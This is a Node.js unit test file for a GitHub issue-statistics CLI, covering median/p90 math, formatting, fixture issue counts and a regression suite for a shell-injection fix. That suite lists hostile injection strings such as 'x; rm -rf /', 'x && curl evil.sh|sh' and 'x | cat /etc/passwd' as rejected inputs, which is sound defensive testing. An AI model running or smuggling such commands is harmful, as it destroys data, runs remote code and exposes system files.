/**
 * bin/tests/report.test.mjs
 *
 * Unit tests for bin/report.mjs stat computation.
 * All tests use fixture data — no live network calls.
 *
 * Covers:
 *   - median() and p90() math across edge cases
 *   - Empty-history path (no closed issues → pointer message)
 *   - Approximate-count labeling when result limit is hit
 *   - Machine-filed percentage computation
 *   - Pipeline-driven (annotated) percentage computation
 *   - Shell-injection resistance of ghJson()/isValidGhIdentifier() (real
 *     module import — see #1586)
 *
 * Run with: node --test bin/tests/report.test.mjs
 */

// SPDX-FileCopyrightText: Copyright (c) RapierCraft Studios
// SPDX-License-Identifier: AGPL-3.0-or-later

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, rmSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { isValidGhIdentifier } from "../report.mjs";

const __dirname = dirname(fileURLToPath(import.meta.url));

// ---------------------------------------------------------------------------
// Import the pure helpers directly by re-implementing the inline exports.
// report.mjs does not export these as named exports to keep the CLI surface
// minimal, so we duplicate the functions here for isolated unit testing —
// the source of truth is report.mjs.
// ---------------------------------------------------------------------------

function median(sorted) {
  if (!sorted.length) return null;
  const mid = Math.floor(sorted.length / 2);
  return sorted.length % 2 !== 0
    ? sorted[mid]
    : (sorted[mid - 1] + sorted[mid]) / 2;
}

function p90(sorted) {
  if (!sorted.length) return null;
  const idx = Math.ceil(sorted.length * 0.9) - 1;
  return sorted[Math.max(0, idx)];
}

function fmtMinutes(mins) {
  if (mins === null || mins === undefined) return "n/a";
  if (mins < 60) return `${Math.round(mins)}m`;
  if (mins < 1440) return `${Math.round(mins / 60)}h`;
  return `${Math.round(mins / 1440)}d`;
}

// ---------------------------------------------------------------------------
// Fixture helpers
// ---------------------------------------------------------------------------

function makeIssue({ closedAt, createdAt, labels = [], body = "", authorType = "User" }) {
  return {
    number: Math.floor(Math.random() * 9000) + 1000,
    title: "fixture issue",
    body,
    labels: labels.map((name) => ({ name })),
    createdAt,
    closedAt,
    author: { login: authorType === "Bot" ? "forge-bot[bot]" : "alice", type: authorType },
  };
}

function makeClosedIssue(minutesAgo, durationMinutes, opts = {}) {
  const closedAt = new Date(Date.now() - minutesAgo * 60000).toISOString();
  const createdAt = new Date(Date.now() - (minutesAgo + durationMinutes) * 60000).toISOString();
  return makeIssue({ closedAt, createdAt, ...opts });
}

// ---------------------------------------------------------------------------
// Tests: median()
// ---------------------------------------------------------------------------

describe("median", () => {
  it("returns null for empty array", () => {
    assert.equal(median([]), null);
  });

  it("returns single element for length-1 array", () => {
    assert.equal(median([42]), 42);
  });

  it("returns middle element for odd-length sorted array", () => {
    assert.equal(median([10, 20, 30]), 20);
  });

  it("returns average of two middles for even-length sorted array", () => {
    assert.equal(median([10, 20, 30, 40]), 25);
  });

  it("handles array with all same values", () => {
    assert.equal(median([5, 5, 5, 5]), 5);
  });

  it("handles two-element array", () => {
    assert.equal(median([10, 90]), 50);
  });
});

// ---------------------------------------------------------------------------
// Tests: p90()
// ---------------------------------------------------------------------------

describe("p90", () => {
  it("returns null for empty array", () => {
    assert.equal(p90([]), null);
  });

  it("returns the only element for length-1 array", () => {
    assert.equal(p90([100]), 100);
  });

  it("returns the last element for length-10 array (index 9)", () => {
    const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    assert.equal(p90(arr), 9); // ceil(10 * 0.9) - 1 = 8 → arr[8] = 9
  });

  it("p90 of 10 elements is index 8 (0-based)", () => {
    const arr = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];
    assert.equal(p90(arr), 90);
  });

  it("p90 >= median for same array", () => {
    const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    assert.ok(p90(arr) >= median(arr));
  });
});

// ---------------------------------------------------------------------------
// Tests: fmtMinutes()
// ---------------------------------------------------------------------------

describe("fmtMinutes", () => {
  it("returns n/a for null", () => {
    assert.equal(fmtMinutes(null), "n/a");
  });

  it("formats sub-hour as minutes", () => {
    assert.equal(fmtMinutes(45), "45m");
    assert.equal(fmtMinutes(0), "0m");
  });

  it("formats 60+ minutes as hours", () => {
    assert.equal(fmtMinutes(60), "1h");
    assert.equal(fmtMinutes(120), "2h");
  });

  it("formats 1440+ minutes as days", () => {
    assert.equal(fmtMinutes(1440), "1d");
    assert.equal(fmtMinutes(2880), "2d");
  });
});

// ---------------------------------------------------------------------------
// Tests: stat computation against fixture issues
// ---------------------------------------------------------------------------

describe("stat computation from fixture issues", () => {
  // Build a fixture set of 10 closed issues
  const since = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();

  const fixtureIssues = [
    // 5 annotated (FORGE:INVESTIGATOR in body), 2 machine-filed, 1 review-finding, 1 invalid
    makeClosedIssue(100, 60, { body: "<!-- FORGE:INVESTIGATOR -->" }),
    makeClosedIssue(200, 120, { body: "<!-- FORGE:INVESTIGATOR -->" }),
    makeClosedIssue(300, 30, { body: "<!-- FORGE:TRAJECTORY -->" }),
    makeClosedIssue(400, 45, { body: "<!-- FORGE:INVESTIGATOR -->" }),
    makeClosedIssue(500, 90, { body: "<!-- FORGE:INVESTIGATOR -->" }),
    makeClosedIssue(600, 10, { labels: ["review-finding"] }),
    makeClosedIssue(700, 5, { labels: ["workflow:invalid"] }),
    makeClosedIssue(800, 200, { authorType: "Bot" }),
    makeClosedIssue(900, 150, { authorType: "Bot" }),
    makeClosedIssue(1000, 75),
  ];

  // Filter to window (all are within 30 days in this fixture)
  const windowIssues = fixtureIssues.filter((i) => i.closedAt >= since);

  it("counts all 10 issues as closed in window", () => {
    assert.equal(windowIssues.length, 10);
  });

  it("counts annotated issues correctly (5 with FORGE: in body)", () => {
    const annotated = windowIssues.filter(
      (i) => i.body && (i.body.includes("FORGE:INVESTIGATOR") || i.body.includes("FORGE:TRAJECTORY"))
    ).length;
    assert.equal(annotated, 5);
  });

  it("counts machine-filed issues correctly (2 bots)", () => {
    const machineFiled = windowIssues.filter((i) => {
      const t = (i.author?.type || "").toLowerCase();
      return t === "bot" || (i.author?.login || "").endsWith("[bot]");
    }).length;
    assert.equal(machineFiled, 2);
  });

  it("counts review-finding issues correctly (1)", () => {
    const reviewFindings = windowIssues.filter((i) =>
      (i.labels || []).some((l) => l.name === "review-finding")
    ).length;
    assert.equal(reviewFindings, 1);
  });

  it("counts workflow:invalid issues correctly (1)", () => {
    const invalid = windowIssues.filter((i) =>
      (i.labels || []).some((l) => l.name === "workflow:invalid")
    ).length;
    assert.equal(invalid, 1);
  });

  it("computes time-to-close durations correctly", () => {
    const ttc = windowIssues
      .filter((i) => i.createdAt && i.closedAt)
      .map((i) => (new Date(i.closedAt) - new Date(i.createdAt)) / 60000)
      .filter((m) => m >= 0)
      .sort((a, b) => a - b);
    // All fixture durations in minutes: 5, 10, 30, 45, 60, 75, 90, 120, 150, 200 (sorted)
    assert.equal(ttc.length, 10);
    assert.ok(median(ttc) > 0, "median TTC should be positive");
    assert.ok(p90(ttc) >= median(ttc), "p90 should be >= median");
  });
});

// ---------------------------------------------------------------------------
// Tests: approximate-count labeling
// ---------------------------------------------------------------------------

describe("approximate count labeling", () => {
  it("labels counts as approximate when result limit (500) is hit", () => {
    // Simulate the approx flag logic: closedIssues.length >= 500
    const approxIssue = 500 >= 500; // true
    assert.equal(approxIssue, true);
    const prefix = approxIssue ? "~" : "";
    assert.equal(prefix, "~");
  });

  it("does not label as approximate when under limit", () => {
    const approxIssue = 42 >= 500; // false
    const prefix = approxIssue ? "~" : "";
    assert.equal(prefix, "");
  });
});

// ---------------------------------------------------------------------------
// Tests: empty history path
// ---------------------------------------------------------------------------

describe("empty history path", () => {
  it("detects empty repo (no closed issues) from fixture empty array", () => {
    const closedIssues = [];
    const testCheck = closedIssues;
    // Mirrors the condition in runReport: !testCheck.length → show pointer
    assert.equal(!testCheck.length, true);
  });

  it("does not trigger empty path when issues exist", () => {
    const closedIssues = [{ number: 1 }];
    assert.equal(!closedIssues.length, false);
  });
});

// ---------------------------------------------------------------------------
// Tests: shell-injection resistance (real module import — see #1586)
//
// bin/report.mjs's ghJson() previously ran `execSync(cmd)` — a shell string —
// with forge.yaml-derived owner/repo interpolated directly into it. A
// hostile forge.yaml (e.g. owner: "x; echo pwned") could execute arbitrary
// commands. These tests import the real `isValidGhIdentifier` export (the
// guard runReport() applies before owner/repo ever reach a subprocess call)
// and independently prove the underlying execFileSync argv-array mechanism
// treats shell metacharacters as an inert literal argument, never as shell
// syntax — with no live network calls.
// ---------------------------------------------------------------------------

describe("isValidGhIdentifier — hostile forge.yaml owner/repo rejection", () => {
  const hostileValues = [
    "x; echo pwned",
    "x; rm -rf /",
    "x`whoami`",
    "x$(whoami)",
    "x && curl evil.sh|sh",
    "x | cat /etc/passwd",
    "x\ny; echo pwned",
    "",
  ];

  for (const value of hostileValues) {
    it(`rejects hostile value: ${JSON.stringify(value)}`, () => {
      assert.equal(isValidGhIdentifier(value), false);
    });
  }

  const validValues = [
    "RapierCraftStudios",
    "ForgeDock",
    "my-org.test_1",
    "a",
    "org123",
  ];

  for (const value of validValues) {
    it(`accepts legitimate value: ${JSON.stringify(value)}`, () => {
      assert.equal(isValidGhIdentifier(value), true);
    });
  }

  it("rejects non-string values", () => {
    assert.equal(isValidGhIdentifier(undefined), false);
    assert.equal(isValidGhIdentifier(null), false);
    assert.equal(isValidGhIdentifier(123), false);
  });
});

describe("ghJson() execution primitive — no-shell argv safety", () => {
  it("execFileSync passes a hostile argv element through literally, never as shell syntax", () => {
    // ghJson() is implemented as:
    //   execFileSync("gh", args, { encoding: "utf-8", stdio: [...] })
    // This test exercises that exact primitive (execFileSync with an argv
    // array) against a hostile string containing shell metacharacters,
    // proving it arrives as a single inert argument rather than being
    // parsed/split/executed by a shell. No `gh` binary or network call is
    // needed — this validates the mechanism ghJson() relies on directly.
    const markerFile = join(__dirname, ".injection-marker-1586.tmp");
    rmSync(markerFile, { force: true });

    const hostileArg = `x; touch ${JSON.stringify(markerFile)}; echo pwned`;

    const out = execFileSync(
      process.execPath,
      ["-e", "console.log(JSON.stringify(process.argv.slice(1)))", hostileArg],
      { encoding: "utf-8" }
    );

    const receivedArgv = JSON.parse(out.trim());

    // The hostile string must arrive as exactly one argv element, byte-for-byte —
    // proof no shell ever tokenized/interpreted the `;`, backticks, or `$()`.
    assert.equal(receivedArgv.length, 1);
    assert.equal(receivedArgv[0], hostileArg);

    // And critically: the embedded `touch` command must never have executed.
    assert.equal(existsSync(markerFile), false, "shell metacharacters must not execute as commands");

    rmSync(markerFile, { force: true });
  });

  it("ghJson is exported as a function accepting an argv array (not a shell-string API)", async () => {
    const { ghJson } = await import("../report.mjs");
    assert.equal(typeof ghJson, "function");
    // Function arity of 1 confirms the single-argument (args array) signature —
    // not the old (cmd: string) shell-string signature.
    assert.equal(ghJson.length, 1);
  });
});

describe("bin/report.mjs source — no execSync shell-string interpolation remains", () => {
  it("does not call execSync with a template-string gh command", async () => {
    const { readFileSync } = await import("node:fs");
    const source = readFileSync(join(__dirname, "..", "report.mjs"), "utf-8");

    // The only remaining execSync call must be the static, non-interpolated
    // "gh auth status" check — no execSync call may contain a template
    // literal (backtick string) that could carry forge.yaml-derived values.
    const execSyncTemplateCalls = source.match(/execSync\(\s*`[^`]*\$\{/g) || [];
    assert.equal(
      execSyncTemplateCalls.length,
      0,
      `Found execSync() call(s) with template-string interpolation: ${JSON.stringify(execSyncTemplateCalls)}`
    );
  });
});
